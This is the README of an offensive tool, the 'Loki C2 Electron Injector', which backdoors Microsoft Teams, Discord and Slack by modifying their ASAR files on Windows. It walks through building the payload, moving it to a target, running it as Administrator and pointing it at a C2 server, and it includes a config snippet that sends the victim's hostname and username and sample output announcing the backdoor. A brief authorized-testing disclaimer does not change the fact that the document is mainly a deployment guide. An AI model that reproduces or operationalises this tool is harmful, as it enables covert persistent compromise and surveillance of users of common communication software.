# Windows Payload - Loki C2 Electron Injector

## 🎯 Quick Start

### Option 1: GitHub Actions CI/CD (Recommended! 🚀)

**Build .exe in the cloud - No Windows machine needed!**

```bash
# 1. Push workflow to GitHub
git add .github/workflows/build-windows-exe.yml
git commit -m "Add Windows build pipeline"
git push

# 2. Go to GitHub → Actions → "Build Windows EXE" → Run workflow
# 3. Download loki_injector.exe from Artifacts (2-3 min build time)
# 4. Done! ✅
```

**See:** `GITHUB_ACTIONS_BUILD.md` for full guide

---

### Option 2: Build on Windows

```batch
# On Windows machine:
build.bat

# Output: dist\loki_injector.exe
```

---

### Option 3: Run Python Script Directly (No Build!)

```bash
# Transfer to Windows:
scp loki_injector.py admin@windows:C:\Temp\

# On Windows:
python loki_injector.py
# Same functionality as .exe!
```

## 📦 What's Included

```
loki_injector.py         - Main payload source
build.bat               - Windows build script
build_docker.sh         - macOS Docker build script
BUILD_WINDOWS_EXE.md    - Detailed build instructions
```

## 🚀 Usage

### After Building:

1. **Transfer to target:**
   ```
   dist/loki_injector.exe  →  Windows target machine
   ```

2. **Execute on target:**
   - Right-click `loki_injector.exe`
   - Select "Run as Administrator"
   - Wait for completion

3. **What it does:**
   - ✅ Scans for vulnerable Electron apps (Teams, Discord, Slack)
   - ✅ Automatically installs required tools (asar)
   - ✅ Creates backups (.backup files)
   - ✅ Injects backdoor into ASAR files
   - ✅ Shows detailed progress
   - ✅ No manual steps required!

## 🎯 Targets

Primary targets (auto-detected):
- **Microsoft Teams** (High Priority)
- **Discord** (High Priority)
- **Slack** (Medium Priority)
- Atom, Signal Desktop (Lower Priority)

## ⚙️ Configuration

### Change C2 Server

Before building, edit `loki_injector.py` line ~30:

```python
const cfg = {
    srv: 'https://YOUR-C2-SERVER.com',  # ← Change this
    int: 60000,
    id: `${os.hostname()}_${os.userInfo().username}`
};
```

## 📋 Requirements

### Build Requirements:
- **Windows:** Python 3.8+, pip
- **macOS (Docker):** Docker Desktop

### Target Requirements:
- Windows OS
- Administrator privileges
- At least one target Electron app installed

## 🛡️ Security Notice

**For authorized penetration testing only!**

- Only use on systems you own or have permission to test
- Malicious use is illegal
- This is a security research tool

## 📊 Expected Output

```
============================================================
Loki C2 - Electron Injector
============================================================

[*] Scanning for Electron applications...
[+] Found: Microsoft Teams
    Path: C:\Users\...\Microsoft\Teams\resources\app.asar

[*] Installing asar tool...
[+] asar tool installed

[*] Stopping Microsoft Teams...
[+] Microsoft Teams stopped

[*] Injecting into Microsoft Teams...
[+] Backup created: app.asar.backup
[+] Extracted ASAR
[+] Created preload.js
[+] Modified index.js
[+] Repacked ASAR
[+] Microsoft Teams injected successfully!

============================================================
INJECTION COMPLETE
============================================================
Successfully injected: 1
  - Microsoft Teams

[*] Restart the injected applications to activate backdoor
```

## 🔧 Troubleshooting

### "Administrator privileges required"
→ Right-click and select "Run as Administrator"

### "No vulnerable Electron apps found"
→ Install Microsoft Teams, Discord, or Slack

### "asar tool installation failed"
→ Install Node.js first: https://nodejs.org/

### Build fails on macOS
→ Install Docker: `brew install --cask docker`

## 📁 File Size

- **Source:** ~8 KB
- **Built .exe:** ~10-15 MB (includes Python runtime)

## ✅ Next Steps

1. Read `BUILD_WINDOWS_EXE.md` for detailed instructions
2. Choose your build method
3. Build the executable
4. Test in isolated lab environment
5. Deploy with authorization

---

**Ready to build?** Run `build.bat` on Windows or `./build_docker.sh` on macOS!
